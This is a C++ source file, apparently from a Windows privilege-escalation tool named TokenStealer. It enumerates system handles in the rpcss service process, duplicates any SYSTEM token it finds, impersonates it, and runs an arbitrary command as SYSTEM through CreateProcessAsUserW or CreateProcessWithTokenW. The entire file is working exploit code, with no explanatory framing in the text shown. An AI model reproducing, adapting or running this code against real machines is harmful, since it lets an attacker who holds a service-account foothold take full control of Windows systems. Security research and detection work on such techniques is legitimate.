// TokenStealer.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <wchar.h>
#include <stdlib.h>
#include "TokenKidnapping.h"
#include "common.h"

#pragma comment(lib,"ntdll.lib")

#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004


BOOL HasAssignPriv = FALSE;
extern wchar_t WinStationName[256];

DWORD GetServicePid(wchar_t* serviceName)
{
	const auto hScm = OpenSCManager(nullptr, nullptr, NULL);
	const auto hSc = OpenService(hScm, serviceName, SERVICE_QUERY_STATUS);

	SERVICE_STATUS_PROCESS ssp = {};
	DWORD bytesNeeded = 0;
	QueryServiceStatusEx(hSc, SC_STATUS_PROCESS_INFO, reinterpret_cast<LPBYTE>(&ssp), sizeof(ssp), &bytesNeeded);

	CloseServiceHandle(hSc);
	CloseServiceHandle(hScm);

	return ssp.dwProcessId;
}


PVOID GetLibraryProcAddress(PSTR LibraryName, PSTR ProcName)
{
	return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}


BOOL EnablePriv(HANDLE hTokenIn, LPCTSTR priv)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken;

	if (hTokenIn == NULL)
	{
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		{
			printf("[-] OpeProcessToken err:%d\n", GetLastError());
			return FALSE;
		}
	}
	else
		hToken = hTokenIn;
	if (!LookupPrivilegeValue(NULL, priv, &luid))
	{
		printf("[-] LookupPrivilege err:%d\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustPrivilege err:%d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}
int IsTokenSystem(HANDLE tok)
{
	DWORD Size;
	TOKEN_USER* User;
	PSID pSID = NULL;

	SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(&SIDAuth, 1,
		SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pSID))
		return FALSE;

	Size = 0;
	GetTokenInformation(tok, TokenUser, NULL, 0, &Size);
	BOOL ret = FALSE;
	if (!Size)
		return FALSE;

	User = (TOKEN_USER*)malloc(Size);

	GetTokenInformation(tok, TokenUser, User, Size, &Size);

	if (EqualSid(pSID, User->User.Sid)) {

		ret = TRUE;
	}
	free(User);
	free(pSID);
	return ret;
}
int ExecuteSystem(wchar_t *command, HANDLE hThreadToken)
{
	_NtQuerySystemInformation NtQuerySystemInformation =
		(_NtQuerySystemInformation)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQuerySystemInformation");
	_NtDuplicateObject NtDuplicateObject =
		(_NtDuplicateObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtDuplicateObject");
	_NtQueryObject NtQueryObject =
		(_NtQueryObject)GetLibraryProcAddress((PSTR)"ntdll.dll", (PSTR)"NtQueryObject");
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION handleInfo;
	ULONG handleInfoSize = 0x10000;
	ULONG pid=0;
	HANDLE processHandle;
	ULONG i;
	HANDLE hObject;
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	BOOL b1, b2;
	DWORD d;
	wchar_t WinStation[100];
	HANDLE dupHandle = NULL;
	POBJECT_TYPE_INFORMATION objectTypeInfo;
	PVOID objectNameInfo;
	UNICODE_STRING objectName;
	ULONG returnLength;
	HANDLE pToken1, pToken2;
	DWORD Size, sessionid = 1;
	BOOL success = FALSE;

	
	wchar_t desktop[256];
	
	wsprintf(desktop, L"%s\\default", WinStationName);
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = (LPWSTR)desktop;
	EnablePriv(hThreadToken, SE_ASSIGNPRIMARYTOKEN_NAME);
	EnablePriv(hThreadToken, SE_IMPERSONATE_NAME);
	
	pid=GetServicePid((wchar_t *)L"rpcss");
	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
	{
		printf("[-] Could not open PID %d!)\n", pid);
		return 0;
	}

	handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
     while ((status = NtQuerySystemInformation(
		SystemHandleInformation,
		handleInfo,
		handleInfoSize,
		NULL
	)) == STATUS_INFO_LENGTH_MISMATCH)
		handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);
	if (!NT_SUCCESS(status))
	{
		printf("NtQuerySystemInformation failed!\n");
		return 0;
	}

	for (i = 0; i < handleInfo->HandleCount; i++)
	{
		SYSTEM_HANDLE handle = handleInfo->Handles[i];

		
		if (handle.ProcessId != pid)
			continue;

		if (DuplicateHandle(processHandle, (HANDLE)handle.Handle,
			GetCurrentProcess(), &dupHandle,
			MAXIMUM_ALLOWED, FALSE, 0x02) == FALSE)
		{
			//printf("[-] Error Dup Handle!%d\n", GetLastError());
		
			continue;
		}

		
		objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
		if (!NT_SUCCESS(NtQueryObject(
			dupHandle,
			ObjectTypeInformation,
			objectTypeInfo,
			0x1000,
			NULL
		)))
		{
			//printf("[-] Error NtQueryObject %d!\n",GetLastError());
			
			CloseHandle(dupHandle);
			continue;
		}

		if (!wcsncmp(objectTypeInfo->Name.Buffer, L"Token", objectTypeInfo->Name.Length / 2))
		{
			if (IsTokenSystem((HANDLE)dupHandle) && ImpersonateLoggedOnUser(dupHandle) != 0)
			{
				printf("[+] Got SYSTEM Token!!!\n", GetLastError());
				if (!DuplicateTokenEx(dupHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &pToken1))
				{
					printf("[-] Error duplicating Primary Token:%d\n", GetLastError());
					break;

				}
				if (!DuplicateTokenEx(dupHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &pToken2))
				{
					printf("[-] Error duplicating ImpersonationToken:%d\n", GetLastError());
					break;

				}
				

				HasAssignPriv = EnablePriv(pToken1, SE_ASSIGNPRIMARYTOKEN_NAME);

				if (HasAssignPriv)
				{

					printf("[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: %S\n", command);
					//GetTokenInformation(hThreadToken, TokenSessionId, &sessionid, sizeof(sessionid), &Size);
					//SetTokenInformation(pToken1, TokenSessionId, &sessionid, sizeof(sessionid));
                  	b1 = CreateProcessAsUserW(
							pToken1,            // client's access token
							NULL,              // file to execute
							command,     // command line
							NULL,              // pointer to process SECURITY_ATTRIBUTES
							NULL,              // pointer to thread SECURITY_ATTRIBUTES
							FALSE,             // handles are not inheritable
							CREATE_NEW_CONSOLE,   // creation flags
							NULL,              // pointer to new environment block
							NULL,              // name of current directory
							&si,               // pointer to STARTUPINFO structure
							&pi                // receives information about new process
						);
					
					//debug
					//printf("[*] Result: %s (%d)\n", b1 ? "TRUE":"FALSE", GetLastError());
					if (b1)
					{
						success = TRUE;
						break;
					}
					

				}
				else
				{
					printf("[*] Token does NOT have SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsWithToken() for launching: %S\n", command);
					
					//GetTokenInformation(hThreadToken, TokenSessionId, &sessionid, sizeof(sessionid), &Size);
					///SetTokenInformation(pToken2, TokenSessionId, &sessionid, sizeof(sessionid));
					RevertToSelf();
					
					b2 = CreateProcessWithTokenW(pToken2,
						0,
						NULL,
						command,
						CREATE_NO_WINDOW, 
						NULL,
						NULL,
						&si,
						&pi);
					//debug
					//printf("[*] Result: %s (%d)\n", b2 ? "TRUE" : "FALSE", GetLastError());
					if (b2)
					{
						success = TRUE;
						break;
					}
					


				}
			}
		}
		free(objectTypeInfo);
		CloseHandle(dupHandle);
	}

	free(handleInfo);
	CloseHandle(processHandle);

	return success;
}